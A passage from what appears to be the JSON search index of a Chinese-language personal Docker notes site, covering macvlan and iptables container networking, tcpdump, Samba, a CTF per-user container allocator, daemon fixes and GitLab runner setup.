--subnet=10.1.1.0/24 --ip-range=10.1.1.64/26 --gateway=10.1.1.1 macvlan_network docker run --net=macvlan_network --ip=10.1.1.100 -d nginx \u73b0\u5728\u4f60\u53ef\u4ee5\u8bbf\u95ee http://10.1.1.100 \u6765\u770b\u5230nginx\u7684\u6b22\u8fce\u9875\u9762\u4e86\uff0c\u4f60\u9700\u8981\u5728\u5185\u7f51\u53e6\u4e00\u53f0\u673a\u5668\u4e0a\u8bbf\u95ee\uff08\u6211\u7684\u53d1\u73b0\u662f\u4e3b\u673a\u548c\u8fd9\u6837\u5206\u914d\u7684\u5bb9\u5668\u662f\u4e0d\u4e92\u901a\u7684\uff09 \u53ef\u80fd\u7684IP\u51b2\u7a81 \u542f\u52a8\u5bb9\u5668\u65f6\u53ef\u4ee5\u4e0d\u6307\u5b9aip\u8ba9docker\u81ea\u52a8\u5206\u914d\uff0c\u8b66\u544a\uff1a\u5982\u679c\u6ca1\u6709\u914d\u7f6eip-range\u53c2\u6570\uff0c\u6709\u53ef\u80fd\u88ab\u5206\u914d\u7684\u6070\u597d\u662f\u4e3b\u673a\u672c\u8eab\u7684IP\uff0c\u8fd9\u79cd\u60c5\u51b5\u5c06\u5bfc\u81f4\u4e3b\u673a\u4e22\u5931IP\u65e0\u6cd5\u8054\u7f51\uff01 \u4e07\u4e00\u53d1\u751f\u8fd9\u79cd\u865a\u62df\u673a\u628a\u4e3b\u673a\u7684IP\u62a2\u5360\u7684\u60c5\u51b5\uff0c\u5728\u6ca1\u6709\u7269\u7406\u63a7\u5236\u65b9\u6cd5\u4e0b\u4e0d\u53ef\u8f7b\u6613\u4f7f\u7528ifconfig\u4fee\u6539\u4e3b\u673aIP\uff0c\u56e0\u4e3a\u4e00\u65e6\u4f7f\u7528ifconfig\u4e3b\u673a\u7684route\u5c06\u88ab\u6e05\u7a7a\u3001\u5f53\u524d\u4e3b\u673a\u7684\u5176\u4ed6IP\u4e5f\u4f1a\u4e22\u5931\uff0c\u4f60\u5c31\u4e22\u5931\u8fdc\u7a0b\u8bbf\u95ee\u7684\u53ef\u80fd\u4e86\uff08\u4e5f\u8bb8\u4f60\u53ef\u4ee5\u5199\u4e00\u4e2a\u811a\u672c\u81ea\u52a8\u6062\u590droute\u7a33\u59a5\u4e00\u70b9\uff09\uff1b\u4f46\u795e\u5947\u7684\u662f\u5373\u4f7f\u4e3b\u673aroute\u5df2\u7ecf\u4e22\u5931\uff0c\u6309\u7167\u4e0a\u8ff0macvlan\u5f00\u51fa\u6765\u7684Docker\u5bb9\u5668\u4ecd\u7136\u5728\u7ebf\uff08\u4e5f\u53ef\u4ee5\u7406\u89e3\u2014\u2014\u5bb9\u5668\u7684route\u5e76\u6ca1\u6709\u53d7\u5230\u5f71\u54cd\uff0c\u7c7b\u4f3c\u4e8eVirtualbox\u7684\u6865\u63a5\u7f51\u5361\u65b9\u5f0f\uff09","title":"\u8ba9Docker\u5bb9\u5668\u5f97\u5230\u5185\u7f51IP"},{"location":"Docker/#macvlanip","text":"@TAG getip # clean version docker inspect --format \" {{ .NetworkSettings.Networks.macvlan\u7f51\u7edc\u540d\u79f0.IPAddress }} \" \u5bb9\u5668\u540d\u79f0 # dirty but quick version docker inspect \u5bb9\u5668\u540d\u79f0 | grep IP","title":"\u83b7\u53d6macvlan\u5bb9\u5668\u7684IP"},{"location":"Docker/#macvlanip_1","text":"\u7531\u4e8e\u4e3b\u673a\u548c\u5bb9\u5668\u4e0d\u80fd\u4e92\u901a\uff0c\u6240\u4ee5\u4e3b\u673a\u5982\u4f55\u5f97\u77e5\u76ee\u524d\u5df2\u7ecf\u5206\u914d\u7684IP\u5217\u8868\u5462\uff1f\u7528docker network inspect\u54af\uff0c\u7136\u540e\u7528python\u5904\u7406\u4e00\u4e0b\u8f93\u51fa\u683c\u5f0f \u4e0b\u9762\u8fd9\u4e2a\u547d\u4ee4\u5217\u51fa\u4e86\u5bb9\u5668IP\u548c\u5bb9\u5668\u540d\u79f0\uff1a docker network inspect macvlan_bridge -- format \"{{range .Containers}}{{.IPv4Address}}@{{.Name}},,,{{end}}\" | python3 - c ' print ( input (). replace ( \"/24@\" , \" \\t \" ). replace ( \",,,\" , \" \\n \" ), end = \"\" ) ' | sort \u5982\u679c\u53ea\u9700\u8981IP\u5217\u8868\uff1a docker network inspect macvlan_bridge --format \" {{ range .Containers }}{{ .IPv4Address }} , {{ end }} \" | python3 -c 'print(input().replace(\"/24,\",\"\\n\"),end=\"\")'|sort","title":"macvlan\u67e5\u770b\u5df2\u7ecf\u5206\u914d\u7684IP"},{"location":"Docker/#macvlan","text":"\u7531\u4e8e\u5185\u6838\u9650\u5236\u5e76\u4e0d\u652f\u6301host\u76f4\u63a5\u4f7f\u7528\u4e0a\u8ff0\u6307\u5b9a\u7684ip\u8bbf\u95ee\u5bb9\u5668\uff0c\u800cdocker network connect\u8ba9\u5bb9\u5668\u518d\u52a0\u5165\u4e00\u4e2a\u7f51\u7edc\u53c8\u4f1a\u6539\u53d8\u5bb9\u5668\u7684\u9ed8\u8ba4\u8def\u7531\uff0c\u4f46\u6211\u5c31\u662f\u60f3\u8ba9\u4e3b\u673a\u80fd\u8bbf\u95ee\u5230\u5bb9\u5668\uff0c\u548b\u529e\u54e9\uff1f \u53c2\u8003\uff1ahttp://blog.oddbit.com/2018/03/12/using-docker-macvlan-networks/ \u60f3\u8bbf\u95ee\u7684\u5bb9\u5668IP\u4e3a10.1.1.66\uff0c\u8fd9\u79cd\u65b9\u6cd5\u9700\u8981\u8ba9\u4e3b\u673a\u518d\u83b7\u5f97\u4e00\u4e2aIP\uff0c\u4f8b\u598210.1.1.3\u3002\u6ce8\u610f\u8fd9\u79cd\u914d\u7f6e\u662f\u4e0d\u6301\u4e45\u7684\uff0c\u91cd\u542f\u540e\u4e22\u5931 DEVICE_NAME = \"eth0\" NAME = \"mynet-shim\" HOST_GETIP = \"10.1.1.3\" TARGET_IP = \"10.1.1.66\" ip link add $ NAME link $ DEVICE_NAME type macvlan mode bridge ip addr add $ HOST_GETIP / 32 dev $ NAME ip link set $ NAME up ip route add $ TARGET_IP / 32 dev $ NAME","title":"\u4e3b\u673a\u8bbf\u95eemacvlan\u7684\u5bb9\u5668"},{"location":"Docker/#iptablesdockerip","text":"\u4e0a\u8ff0\u57fa\u4e8emacvlan\u7684\u65b9\u6cd5\u5bb9\u5668\u65e0\u6cd5\u4e0e\u4e3b\u673a\u901a\u8baf\uff0c\u6240\u4ee5\u4e0b\u8ff0\u57fa\u4e8eiptables\u7aef\u53e3\u8f6c\u53d1\u7684\u65b9\u6cd5\u66f4\u80dc\u4e00\u7b79 \u8fd9\u79cd\u65b9\u6cd5\u57fa\u4e8e\u4e3b\u673a\u81ea\u5df1\u53bb\u83b7\u5f97\u4e00\u4e2a\u989d\u5916\u7684\u5185\u7f51ip\u540e\uff0c\u7528iptables\u7aef\u53e3\u8f6c\u53d1\u6765\u5b9e\u73b0\u7ed9\u5bb9\u5668\u5185\u7f51IP\u7684\u6548\u679c\uff0c\u5bb9\u5668\u5e94\u7528\u53ef\u4ee5\u5f97\u5230\u8bf7\u6c42\u6e90IP\uff0c\u4f46\u5bb9\u5668\u5411\u5916\u53d1\u8d77\u7684tcp\u8bf7\u6c42\u8fd8\u662f\u4e3b\u673a\u81ea\u8eab\u7684\u9ed8\u8ba4IP \u8be5\u811a\u672c\u8fd0\u884c\u65f6\u9700\u8981\u4e24\u4e2a\u53c2\u6570 \u7b2c\u4e00\u4e2a\u4e3a\u5bb9\u5668\u540d\u79f0 \u7b2c\u4e8c\u4e2a\u4e3a\u65b0\u7684IP\u540e\u7f00 \u4e3e\u4e2a\u4f8b\u5b50 \u4e3b\u673a\u572810.12.34.x\u8fd9\u4e2a\u5185\u7f51\u5730\u5740\u6bb5 \u4e14\u53ef\u4ee5\u968f\u610f\u5f97\u5230\u8fd9\u4e2a\u5730\u5740\u6bb5\u7684\u5185\u7f51IP\uff0c\u73b0\u5728\u8981\u7ed9mysql\u5bb9\u566810.12.34.202\u8fd9\u4e2aIP\uff0c\u8fd0\u884c\u65b9\u5f0f\u5c31\u662f ./give_container_ip.sh mysql 202 \u8bb0\u5f97\u4fee\u6539\u4e0b\u9762\u7684IPPREFIX\u548cETH0\u53d8\u91cf\uff01","title":"\u4f7f\u7528iptables\u7aef\u53e3\u8f6c\u53d1\u8ba9Docker\u5bb9\u5668\u5f97\u5230\u5185\u7f51IP"},{"location":"Docker/#give_container_ipsh","text":"@TAG \u7aef\u53e3\u8f6c\u53d1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #!/bin/bash set -ex shopt -s expand_aliases if [ -z $1 ] && [ -z $2 ] ; then echo \"Usage: $0 <container name> <new IP suffix>\" echo \"Example: $0 u202 202\" exit 1 fi alias getip = \"docker inspect --format '{{.NetworkSettings.IPAddress}}' \" IPPREFIX = \"10.12.34.\" ETH0 = \"eth0\" sudo ifconfig $ETH0 : $2 $IPPREFIX$2 netmask 255 .255.255.0 up sudo iptables -t nat -I PREROUTING -d $IPPREFIX$2 -p tcp -j DNAT --to ` getip $1 ` sudo iptables -t nat -I POSTROUTING -s ` getip $1 ` /32 -d ` getip $1 ` /32 -p tcp -m tcp -j MASQUERADE \u4e3a\u4ec0\u4e48\u6700\u540e\u7528MASQUERADE\u800c\u4e0d\u7528SNAT\u5462\uff1f\u56e0\u4e3a\u7528SNAT\u5bb9\u5668\u7684\u5e94\u7528\u5c31\u4e0d\u80fd\u5f97\u5230\u8bf7\u6c42\u7684\u6e90IP\uff0c\u5728\u5b9e\u9645\u5e94\u7528\u4e2d\u662f\u65e0\u6cd5\u63a5\u53d7\u7684\uff1b\u8fd9\u4e00\u6761iptables\u89c4\u5219\u662f\u6211\u7528 docker run -p \u548c iptables-save \u5f97\u5230\u7684","title":"give_container_ip.sh"},{"location":"Docker/#tcpdump","text":"Learned from: https://www.slideshare.net/SreenivasMakam/docker-networking-common-issues-and-troubleshooting-techniques docker run -ti --net container:<containerid> nicolaka/netshoot tcpdump -i eth0 -n port 80 \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u4e0a\u8ff0\u542f\u52a8\u4e86nginx\u5bb9\u5668\u5e76\u5206\u914d\u4e86\u5185\u7f51ip 10.1.1.100\uff0c\u6211\u4eec\u6765\u6536\u96c680\u7aef\u53e3\u7684\u6d41\u91cf\uff0c\u5e76\u4fdd\u5b58\u5230/tmp/pcapfiles/nginx.pcap\u6587\u4ef6\uff1a docker run -ti --net container:f5fc -v /tmp/pcapfiles:/data nicolaka/netshoot tcpdump -i eth0 -n -s0 -w /data/nginx.pcap port 80 \u67e5\u770btcpdump\u53c2\u6570\u89e3\u91caexplainshell","title":"\u5bf9\u5bb9\u5668\u7f51\u7edc\u6d41\u91cftcpdump"},{"location":"Docker/#_9","text":"docker run\u7684\u65f6\u5019\u5fd8\u4e86\u6307\u5b9arestart=always\uff0c\u9664\u4e86commit\u540e\u518d\u6b63\u786e\u5730run\u4e00\u904d\u4e4b\u5916\u6709\u6ca1\u6709\u66f4\u52a0\u4f18\u96c5\u7684\u4fee\u6539\u5bb9\u5668\u53c2\u6570\u7684\u65b9\u6cd5\u5462\uff1f \u53c2\u8003\uff1a https://stackoverflow.com/questions/26852321/docker-add-a-restart-policy-to-a-container-that-was-already-created \u57281.11\u7248\u672c\u540e\u6709\u4e86 docker update \u8fd9\u4e2a\u547d\u4ee4\uff0c\u53ef\u4ee5\u4fee\u6539\u6b63\u5728\u8fd0\u884c\u7684\u5bb9\u5668\u7684\u53c2\u6570\uff0c\u5982CPU\u9650\u5236\u3001\u5185\u5b58\u9650\u5236 \u548c \u91cd\u542f\u7b56\u7565 \u4f7f\u76ee\u524d\u8fd0\u884c\u7684\u6240\u6709\u5bb9\u5668\u90fd\u8bbe\u7f6e\u4e3a\u81ea\u52a8\u91cd\u542f\uff1a docker update --restart=always `docker ps -q` \u5982\u679c\u8981\u53d6\u6d88\u8fd9\u4e2a\u81ea\u52a8\u91cd\u542f\uff0c\u6539\u4e3a --restart=no \u5373\u53ef","title":"\u4fee\u6539\u6b63\u5728\u8fd0\u884c\u7684\u5bb9\u5668\u7684\u91cd\u542f\u7b56\u7565"},{"location":"Docker/#samba","text":"@TAG share \u955c\u50cf\u5730\u5740\uff1a dperson/samba \u5feb\u901f\u5206\u4eab\u4e00\u4e2a\u76ee\u5f55/data\uff0c\u7528\u6237\u540d user \u5bc6\u7801 badpassword \uff1a docker run -d -p 139:139 -p 445:445 --name samba -v /data:/data dperson/samba -u \"user;badpassword\" -s \"data;/data;yes;no;no;all\" \u5176\u4e2d-u\u6307\u5b9a\u7528\u6237\u540d\u5bc6\u7801\uff1b-s\u53c2\u6570\u7684\u683c\u5f0f\u4e3a\uff1a \u7ed9\u8bbf\u95ee\u8005\u770b\u7684\u5206\u4eab\u540d\u79f0;\u7269\u7406\u4f4d\u7f6e;\u662f\u5426\u5217\u51fa;\u672a\u767b\u5f55\u53ef\u5426\u8bbf\u95ee;\u5141\u8bb8\u8bbf\u95ee\u7684\u7528\u6237(all\u8868\u793a\u6240\u6709\u7528\u6237)","title":"\u5feb\u901f\u90e8\u7f72samba"},{"location":"Docker/#_10","text":"@TAG ctf xinetd \u6709\u4e9b\u9898\u76ee\u9700\u8981\u7ed9\u6bcf\u4e2a\u4eba\u5355\u72ec\u7684\u5bb9\u5668\uff0c\u4e3a\u4e86\u8282\u7ea6\u8d44\u6e90\u8fd8\u9700\u8981\u8bbe\u7f6e\u4e00\u4e2a\u65f6\u95f4\uff0c\u8fc7\u671f\u540e\u81ea\u52a8\u5220\u9664\u5bb9\u5668 \u4e3a\u4e86\u9632\u6b62\u6ee5\u7528\u8fd8\u8981\u5f15\u5165Proof Of Work\uff0c\u56de\u7b54\u6b63\u786e\u540e\u624d\u5206\u914d\u5bb9\u5668 Warning \u8be5\u4ee3\u7801\u76f4\u63a5\u7528\u7684docker\u547d\u4ee4\u6765\u521b\u5efa\u5bb9\u5668\uff0c\u4e14\u9700\u8981root\u6743\u9650\uff0c\u6ce8\u610f\u4f7f\u7528\u4e0a\u7684\u5b89\u5168\u98ce\u9669 \u4ee3\u7801\u5982\u4e0b\uff1a utils.py #/usr/bin/python3 #coding:utf-8 import subprocess import time import string import os import hashlib import random from random import randint # \u9650\u65f6\u8bbe\u5b9a def clock ( timeout = 5 ): import signal def signal_handler ( signum , data ): if signum == signal . SIGALRM : print ( \"Time is up!\" ) exit () signal . signal ( signal . SIGALRM , signal_handler ) signal . alarm ( int ( timeout )) # \u751f\u6210\u968f\u673a\u5b57\u7b26\u4e32 def randomstring ( len = 5 ): return '' . join ( random . sample ( string . ascii_letters , len )) # \u8ba1\u7b97md5 def md5 ( src ): return hashlib . md5 ( bytes ( src , encoding = 'utf-8' )) . hexdigest () # \u663e\u793a\u4e00\u4e2a\u968f\u673a\u5b57\u7b26\u4e32\uff0c\u8981\u6c42\u7528\u6237\u8ba1\u7b97\u5176md5 def pow_calcmd5 (): question = randomstring () answer = md5 ( question ) print ( \"Please calculate md5( %s )=\" % question , end = '' ) if input () != answer : exit () # \u663e\u793a\u4e00\u4e2a\u968f\u673a\u5b57\u7b26\u4e32\uff0c\u8981\u6c42\u7528\u6237\u8f93\u5165\u53e6\u4e00\u4e2a\u5b57\u7b26\u4e32\u6ee1\u8db3md5\u4ee5difficulty\u4e2a0\u5f00\u5934 def pow_realmd5 ( difficulty = 4 ): question = randomstring () print ( \"[Proof Of Work]\" ) print ( \"Please calculate s, make that \\n md5( \\\" %s \\\" +s).startswith(' %s ')\" % ( question , '0' * difficulty )) print ( \"Input your s:\" , end = '' ) s = input () if not md5 ( question + s ) . startswith ( '0' * difficulty ): exit () # \u4ece\u955c\u50cf\u542f\u52a8\u5bb9\u5668 def start_container ( image , port , paramstring ): \"\"\" image:\u955c\u50cf\u540d\u79f0 port: \u9700\u8981\u6620\u5c04\u7684\u7aef\u53e3 paramstring: \u989d\u5916\u7684\u53c2\u6570\u8bbe\u7f6e\u5b57\u7b26\u4e32 \u5982\"-v /d/blabla:/data\" \u8fd4\u56de(\u5bb9\u5668ID, \u6620\u5c04\u5f97\u5230\u7684\u7aef\u53e3) \"\"\" container = subprocess . check_output ( \"docker run -d -p :\" + str ( port ) + \" \" + paramstring + \" \" + image + \" /run.sh\" , shell = True ) . decode () . replace ( \" \\n \" , \"\" ) inspect = subprocess . check_output ( \"docker inspect --format '{{.NetworkSettings.Ports}}' %s \" % container , shell = True ) . decode () . replace ( \" \\n \" , \"\" ) openport = inspect . split ( \"{\" )[ 1 ] . split ()[ 1 ] . split ( \"}\" )[ 0 ] return ( container , openport ) # \u8ba1\u5212\u5728minutes\u5206\u949f\u540e\u9500\u6bc1\u5bb9\u5668container \u9700\u8981atd\u670d\u52a1 def plan_stop_container ( container , minutes ): PATH = os . getcwd () minutes = str ( minutes ) filename = \" %s _ %d \" % ( time . strftime ( \"%Y_%m_ %d _%H_%M_%S\" ), randint ( 0 , 666 )) open ( PATH + \"/\" + filename , \"w\" ) . write ( \"docker kill %s && docker rm %s && rm %s / %s \" % ( container , container , PATH , filename )) subprocess . check_output ( \"at now + %s minutes -f %s 2>/dev/null\" % ( minutes , filename ), shell = True ) # \u751f\u6210\u4e00\u4e2arunner\u7684\u4e8c\u8fdb\u5236\u7a0b\u5e8f\uff0cxinetd\u5e76\u4e0d\u652f\u6301\u76f4\u63a5\u8fd0\u884cpython if __name__ == \"__main__\" : print ( \"[*] writing to runner.c\" ) path = os . getcwd () open ( \"runner.c\" , \"w\" ) . write ( \"\"\"#include <stdio.h> #include <stdlib.h> #include <unistd.h> int main(){ chdir(\" %s \"); system(\"python3 %s /runner.py\"); return 0; } \"\"\" % ( path , path )) print ( \"[*] compile runner.c to runner\" ) os . system ( \"gcc runner.c -o runner\" ) \u7528\u5230\u7684xinetd\u914d\u7f6e\uff1a runner.conf \uff0c\u6ce8\u610f\u4fdd\u5b58\u7684\u65f6\u5019\u4e0d\u80fd\u6709\\r :set ff=unix service \u9898\u76ee\u540d\u79f0 { socket_type = stream protocol = tcp wait = no user = root bind = 0.0.0.0 server = /\u7edd\u5bf9\u8def\u5f84/runner type = UNLISTED port = \u7aef\u53e3\u53f7 disable = no }","title":"\u6309\u9700\u5206\u914d\u5bb9\u5668 \u8fc7\u671f\u81ea\u52a8\u9500\u6bc1"},{"location":"Docker/#ab","text":"\u5bb9\u5668A\u662fweb\u5e94\u7528\uff0c\u9700\u8981\u8bbf\u95eeredis\u7684\u5bb9\u5668B\uff0c\u5982\u679c\u7528docker inspect\u62ff\u5230\u73b0\u5728\u5bb9\u5668B\u7684IP\u5199\u5165\u5230\u914d\u7f6e\uff0c\u4e00\u65e6docker\u91cd\u542f\u8fd9\u4e2a\u5bb9\u5668IP\u5c31\u4f1a\u53d1\u751f\u53d8\u5316 \u66f4\u597d\u7684\u65b9\u5f0f\u662f\u4f7f\u7528docker\u7684\u81ea\u5b9a\u4e49\u7f51\u7edc\uff1a\u521b\u5efa\u7f51\u7edc\uff0c\u628aredis\u52a0\u5165\u7f51\u7edc\uff0c\u628aapp\u52a0\u5165\u7f51\u7edc docker network create useredis docker network connect --alias redis useredis redis docker network connect --alias app useredis app \u5728\u52a0\u5165\u7f51\u7edc\u7684\u65f6\u5019\u6307\u5b9a\u2013alias\u5373\u53ef\uff0c\u7f51\u7edc\u4e2d\u7684\u5176\u4ed6\u5bb9\u5668\u5c31\u80fd\u901a\u8fc7\u8fd9\u4e2aalias\u8bbf\u95ee\u5230\uff0c\u8fd9\u6837\u64cd\u4f5c\u540eapp\u5bb9\u5668\u91cc\u9762\u5c31\u80fdping redis\u4e86","title":"\u5728\u5bb9\u5668A\u4e2d\u4f7f\u7528\u522b\u540d\u8bbf\u95ee\u5bb9\u5668B"},{"location":"Docker/#docker1802start","text":"apt\u8bf4\u53ef\u4ee5\u66f4\u65b0\uff0c\u4e8e\u662f\u5c31\u66f4\u65b0\u4e86\uff0c\u7136\u800c\u5374\u60b2\u50ac\u5730\u53d1\u73b0\u90e8\u5206\u5bb9\u5668\u65e0\u6cd5\u542f\u52a8\uff0c\u62a5\u9519\u4fe1\u606f\uff1a docker start <container_name> returns \"container <hash> already exists\" Google\u627e\u5230\u4e86\u76f8\u5173issue\u5728 \u8fd9\u91cc \u4e0d\u5220\u5bb9\u5668\u91cd\u5efa\u3001\u4e0d\u56de\u6edaDocker\u7684\u89e3\u51b3\u65b9\u6848\u4e3a\uff1a sudo docker-containerd-ctr --namespace moby --address /run/docker/containerd/docker-containerd.sock c rm `docker inspect --format ' {{ .Id }} ' \u65e0\u6cd5\u542f\u52a8\u7684\u5bb9\u5668\u540d\u79f0` \u6ce8\u610f\u9700\u8981\u8f93\u5165\u7684\u662f\u90a3\u4e2a\u5f88\u957f\u7684\u5bb9\u5668id\uff0c\u6240\u4ee5\u5148\u7528docker inspect\u83b7\u53d6\u5176\u957fId \u5982\u679cdocker-containerd-ctr \u4e0d\u5b58\u5728\uff0c\u4e5f\u8bb8\u4f60\u4f7f\u7528\u7684\u662fDocker for mac\uff0c\u9700\u8981\u8fd9\u4e48\u64cd\u4f5c\uff1a docker run -it --rm -v /:/host alpine /host/usr/local/bin/docker-containerd-ctr --namespace moby --address /host/run/docker/containerd/docker-containerd.sock c rm \u51fa\u9519\u7684\u5bb9\u5668id","title":"\u4fee\u590dDocker\u66f4\u65b0\u523018.02\u540e\u90e8\u5206\u5bb9\u5668\u65e0\u6cd5start\u7684\u95ee\u9898"},{"location":"Docker/#docker-exec-it","text":"\u53d1\u73b0docker exec -it\u8fdb\u5165\u5bb9\u5668\u7684bash\u540etty\u7684\u5927\u5c0f\u4e0d\u5bf9 \u53ea\u670980x24\uff0c\u53c2\u8003\u8fd9\u4e2a https://github.com/moby/moby/issues/35407 \u89e3\u51b3\u65b9\u6848\uff1a\u5728\u8fdb\u5165\u5bb9\u5668\u65f6\u914d\u7f6e\u73af\u5883\u53d8\u91cfCOLUMNS\u548cLINES\u4e3a\u6b63\u786e\u503c\u5373\u53ef\uff0c\u4e3a\u4e86\u4fbf\u4e8e\u64cd\u4f5c\u4e0e\u8bb0\u5fc6\uff0c\u5199~/.bashrc\u54af\uff1a function din(){ docker exec -ti --env COLUMNS=`tput cols` --env LINES=`tput lines` $1 /bin/bash } alias din=din \u4f7f\u7528\u7684\u65f6\u5019\u53ea\u9700\u8981 din \u5bb9\u5668\u540d\u79f0 \u5c31\u80fd\u8fdb\u5165\u5bb9\u5668bash\u5566\uff0c\u8fd9\u6837\u8fdb\u5165\u5bb9\u5668vim\u4e5f\u80fd\u5168\u5c4f\u5e55\u663e\u793a\u4e86","title":"\u89e3\u51b3docker exec -it\u8fdb\u5165\u5bb9\u5668\u5c4f\u5e55\u5927\u5c0f\u4e0d\u5bf9\u7684\u95ee\u9898"},{"location":"Docker/#docker-pull","text":"\u8be5\u811a\u672c\u5b58\u5728\u95ee\u9898\uff0c\u4e0b\u8f7d\u5230\u7684\u955c\u50cf\u5c42\u53ef\u80fd\u65e0\u6cd5\u5bfc\u5165\uff0c\u4ecd\u5f85\u7814\u7a76 github\u4e0a\u5b98\u65b9\u6709\u4e0b\u8f7d\u811a\u672c\uff1a https://github.com/moby/moby/blob/master/contrib/download-frozen-image-v2.sh \u4f7f\u7528\u7684\u65f6\u5019\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u76ee\u5f55\u540d\u79f0\uff0c\u7b2c\u4e8c\u4e2a\u662f\u955c\u50cf\u540d\u79f0:latest\uff0c\u5176\u4e2d:tag\u662f\u5fc5\u987b\u8981\u5199\u7684 \u4e0b\u8ff0\u547d\u4ee4\u4e0b\u8f7d\u811a\u672c\uff0c\u66ff\u6362\u4e3a\u4ece\u963f\u91cc\u4e91\u4e0b\u8f7d\uff0c\u6700\u540e\u6253\u5305\u6210golang.tar \uff08\u7531\u4e8e\u4e0b\u8f7d\u5230\u7684layer\u7684tar\u5305\u5df2\u7ecf\u662fgzip\u538b\u7f29\u8fc7\u7684 \u6ca1\u5fc5\u8981\u518d7zip\u538b\u7f29\uff09 wget https : // raw . githubusercontent . com / moby / moby / master / contrib / download - frozen - image - v2 . sh sed - i 's/registry-1.docker.io/h0kyslzs.mirror.aliyuncs.com/g' download - frozen - image - v2 . sh sed - i 's/token=\"$(/token=\"\" #/g' download - frozen - image - v2 . sh chmod + x download - frozen - image - v2 . sh ./ download - frozen - image - v2 . sh / tmp / golang google / golang : latest tar - vf golang . tar - cC '/tmp/golang' . \u7136\u540e\u5c31\u53ef\u4ee5\u4f20\u8f93golang.tar\uff0c\u5bfc\u5165\u65b9\u6cd5\u5f88\u7b80\u5355 docker load < golang . tar","title":"\u4e0d\u4f7f\u7528docker pull\u4e5f\u80fd\u4e0b\u8f7d\u5230\u955c\u50cf"},{"location":"Docker/#docker-daemon","text":"\u6709\u65f6\u5019\u9700\u8981\u8fdb\u884cbuild\u64cd\u4f5c\uff0c\u53d1\u73b0\u6839\u76ee\u5f55\u5269\u4f59\u7a7a\u95f4\u4e0d\u591f\u4e86\uff0c\u4f46\u53e6\u5916\u4e00\u5757\u786c\u76d8\u8fd8\u6709\u7a7a\u95f4\uff0c\u6574\u4f53\u8fc1\u79fb/var/lib/docker\u6216\u5408\u5e76\u4e24\u4e2a\u786c\u76d8\u4e3alvm\u53c8\u4e0d\u73b0\u5b9e\uff0c\u8fd9\u65f6\u5c31\u53ef\u4ee5\u5f00\u542f\u4e00\u4e2a\u65b0\u7684Docker Daemon\uff0c\u628aDocker\u4f7f\u7528\u7684\u76ee\u5f55\u8bbe\u7f6e\u4e3a\u53e6\u4e00\u5757\u786c\u76d8 \u53c2\u8003\uff1ahttp://blog.alpaca.ai/run-multiple-docker-daemons-with-net-container/ docker\u5de5\u4f5c\u76ee\u5f55\u5047\u8bbe\u4e3a/home/cy/docker \u7b2c\u4e00\u6b21\u6267\u884c\uff1a OFFSET=0 u=\"cy\" BRIDGE_NAME=br_ ${ u } DOCKER_ROOT=/home/ ${ u } /docker mkdir -p ${ DOCKER_ROOT } brctl addbr ${ BRIDGE_NAME } SUBNET=$(expr 52 + ${ OFFSET } ) ip addr add 172.18. ${ SUBNET } .1/24 dev ${ BRIDGE_NAME } ip link set dev ${ BRIDGE_NAME } up iptables -t nat -A POSTROUTING -j MASQUERADE -s 172.18. ${ SUBNET } .0/24 -d 0.0.0.0/0 \u8fd0\u884cdockerd\u6267\u884c\uff1a u=\"cy\" BRIDGE_NAME=br_ ${ u } DOCKER_ROOT=/home/ ${ u } /docker dockerd -D \\ -g ${ DOCKER_ROOT } /g \\ --exec-root= ${ DOCKER_ROOT } /e \\ -b ${ BRIDGE_NAME } \\ --dns=8.8.8.8 \\ --iptables=true \\ -H unix:// ${ DOCKER_ROOT } /docker.sock \\ -p ${ DOCKER_ROOT } /docker.pid","title":"\u542f\u52a8\u53e6\u4e00\u4e2aDocker Daemon\u8fdb\u7a0b"},{"location":"Docker/#dockergitlab-ci","text":"\u53c2\u8003\u6587\u6863\uff1a \u5b98\u65b9\u6559\u7a0b https://docs.gitlab.com/runner/ \u9ad8\u7ea7\u914d\u7f6e https://docs.gitlab.com/runner/configuration/advanced-configuration.html \u4eba\u5bb6\u8fd9\u4e1c\u897f\u672c\u8d28\u4e0a\u662f\u4e00\u4e2adocker\u5bb9\u5668\uff0c\u4f46\u662f\u628a\u4e3b\u673a\u7684docker sock\u4f20\u5165\u5230\u5bb9\u5668\u4e2d\uff0c\u6240\u4ee5\u5bb9\u5668\u5185\u53ef\u4ee5\u521b\u5efa\u5bb9\u5668 \u6211\u8fd9\u91cc\u7684\u6559\u7a0b\u7740\u91cd\u89e3\u51b3\u4e24\u4e2a\u95ee\u9898\uff1a\u4f7f\u7528\u81ea\u5b9a\u4e49\u7684\u955c\u50cf\uff0c\u8bbe\u7f6eDNS","title":"\u914d\u7f6e\u4f7f\u7528Docker\u7248\u672c\u7684Gitlab CI"},{"location":"Docker/#pullrunner","text":"docker pull gitlab/gitlab-runner","title":"\u7b2c\u4e00\u6b65\u5f53\u7136\u662fpull\u4eba\u5bb6\u7684runner\u955c\u50cf\u54af"},{"location":"Docker/#citoken","text":"\u5728\u7ba1\u7406\u5458\u754c\u9762 Overview\u4e0bRunners\u70b9\u5f00\u5373\u53ef\u770b\u5230 \u7f51\u5740\uff1a /admin/runners","title":"\u7b2c\u4e8c\u6b65 \u83b7\u53d6CI\u8fde\u63a5\u65f6\u9700\u8981\u7684token"},{"location":"Docker/#_11","text":"\u53c2\u8003https://docs.gitlab.com/runner/register/index.html#docker \u5047\u8bbe\u5bb9\u5668\u914d\u7f6e\u6587\u4ef6\u4fdd\u5b58\u5728/dockerfiles/gitlabrunner\u4e2d\uff0c\u5176\u4e2ddocker-image\u662f\u9ed8\u8ba4\u8dd1\u4efb\u52a1\u7684\u955c\u50cf docker run --rm -t -i -v /dockerfiles/gitlabrunner:/etc/gitlab-runner --dns 10.0.0.1 gitlab/gitlab-runner register --non-interactive \\ --url \"https://gitlab.com/\" \\ --registration-token \"\u4e0a\u4e00\u6b65\u83b7\u5f97\u7684token\" \\ --executor \"docker\" \\ --docker-image myubuntu:latest \\ --description \"docker-runner\" \\ --run-untagged \\ --locked=\"false\"","title":"\u7b2c\u4e09\u6b65 \u6ce8\u518c\u4ee5\u751f\u6210\u521d\u59cb\u7684\u914d\u7f6e\u4fe1\u606f"},{"location":"Docker/#_12","text":"\u53c2\u8003\u9ad8\u7ea7\u914d\u7f6e https://docs.gitlab.com/runner/configuration/advanced-configuration.html \u548c https://docs.gitlab.com/runner/executors/docker.html#how-pull-policies-work cd /dockerfiles/gitlabrunner #\u4f60\u7684\u914d\u7f6e\u6587\u4ef6\u76ee\u5f55 sudo vim config.yml 